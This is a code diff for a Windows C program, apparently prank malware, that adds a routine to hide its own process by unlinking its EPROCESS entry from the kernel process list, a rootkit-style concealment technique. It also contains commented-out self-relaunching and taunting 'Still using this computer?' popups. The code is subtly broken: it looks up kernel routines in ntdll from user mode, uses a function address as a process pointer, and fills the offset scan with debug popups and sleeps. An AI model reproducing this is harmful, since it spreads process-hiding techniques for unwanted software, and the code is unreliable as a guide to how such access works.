@@ -3,6 +3,8 @@
 #define ARG L"monitorproc"
 
 void monitor();
+void hidep();
+ULONG find_eproc_pid();
 
 VOID CALLBACK WaitOrTimerCallback(
 	_In_  PVOID lpParameter,
@@ -21,35 +23,34 @@ VOID CALLBACK WaitOrTimerCallback(
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 
 	int argc;
-	int poop = FSCTL_GET_NTFS_VOLUME_DATA;
+	
+	popup("Process Started..", "Hi");
+	hidep();
 
-	char buff[100] = { 0 };
-	sprintf_s(buff, "%p", poop);
-	popup(buff, buff);
-
+	
 	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
-	if (argc == 1 || lstrcmpW(argv[1], ARG)) {
+	//if (argc == 1 || lstrcmpW(argv[1], ARG)) {
 
-		
-		//CreateThread(NULL, NULL, &blink, NULL, 0, NULL);
+	//	
+	//	//CreateThread(NULL, NULL, &blink, NULL, 0, NULL);
 
-		LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
-		GetModuleFileName(NULL, procn, MAX_PATH * 2);
+	//	LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
+	//	GetModuleFileName(NULL, procn, MAX_PATH * 2);
 
-		ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
-		
-		Sleep(100000);
-		popup("lol", "Still using this computer?\n");
-		
-	}
-	else {
+	//	ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
+	//	
+	//	Sleep(100000);
+	//	popup("lol", "Still using this computer?\n");
+	//	
+	//}
+	//else {
 
-		//argv[0] = (LPWSTR)L"Blabla";
+	//	//argv[0] = (LPWSTR)L"Blabla";
 
-	}
+	//}
 
-	monitor();
+	//monitor();
 
 	//while (popup("lol", "Still using this computer?\n") == IDYES) {}
 	//HANDLE lightsT = CreateThread(NULL, NULL, &FlashLEDs, NULL, 0, NULL);
@@ -100,45 +101,83 @@ void monitor() {
 	CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated
 }
 
+
+
 void hidep() {
 
-	ULONG PID_OFFSET = find_eproc_pid();
-
-
-
 	
+
+	ULONG PID_OFFSET = find_eproc_pid();
+	
+	ULONG LIST_OFFSET = PID_OFFSET;
+
+	LIST_OFFSET += sizeof(INT_PTR);
+
+	// I hate Microsoft 
+	PsGetCurrentProcess GetPEproc = (PsGetCurrentProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "PsGetCurrentProcess");
+	LPVOID currentProcess = GetPEproc();
+
+	PLIST_ENTRY current = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
+	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
+
+	PLIST_ENTRY prev;
+	PLIST_ENTRY next;
+
+	prev = current->Blink;
+	next = current->Flink;
+
+	prev->Flink = next;
+	next->Blink = prev;
+	
+	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
+	current->Blink = (PLIST_ENTRY)&current->Flink;
+	current->Flink = (PLIST_ENTRY)&current->Flink;
 }
-
-
-
-
-
-
-
-static const UINT8 pid_amount = 3;
 
 ULONG find_eproc_pid() {
 
 	ULONG offset = 0;
 	int index = 0;
 
-	// I hate Microsoft 
-	PsGetCurrentProcess GetPEproc = (PsGetCurrentProcess)GetProcAddress(GetModuleHandle((LPCWSTR)"ntdll.dll"), "PsGetCurrentProcess");
+	char text[100];
+	int returnLength;
+	
+	HMODULE hNtDll = LoadLibraryA("ntdll.dll");
+	
+	if (!GetModuleHandleA("ntoskrnl.exe")) {
+		popup("Bad", "Very bad");
+		sprintf_s(text, "%d", GetLastError());
+		popup("Interesting", text);
+		popup("Wtf", "huih");
 
-	LPVOID PEProc = GetPEproc();
-
-	for (unsigned int i = 0x20; i < 0x300; i += 4) {
-
-		if (*(ULONG*)((UCHAR*)PEProc + i) == GetCurrentProcessId()) {
-
-		}
-		
+	}
+	else {
+		popup("Good!", "Nice");
 	}
 	
 	
+	// I hate Microsoft 
+	LPVOID PEProc = (PsGetCurrentProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "IoGetCurrentProcess");
+
+
+	//sprintf_s(text, "%d", GetLastError());
+	//popup(text, text);
+
+
+	popup("hkt", "fjd");
+	for (unsigned int i = 0x20; i < 0x300; i += 4) {
+
+		
+		Sleep(5000);
+		if (*(ULONG*)((UCHAR*)PEProc + i) == GetCurrentProcessId()) {
+			
+			offset = i; break;
+		}
+	}
+
+	/*char buff[100];
+	sprintf_s(buff, "%ld", offset);
+	popup(buff, buff);*/
 	
-	
-
-
-
+	return offset;
 }
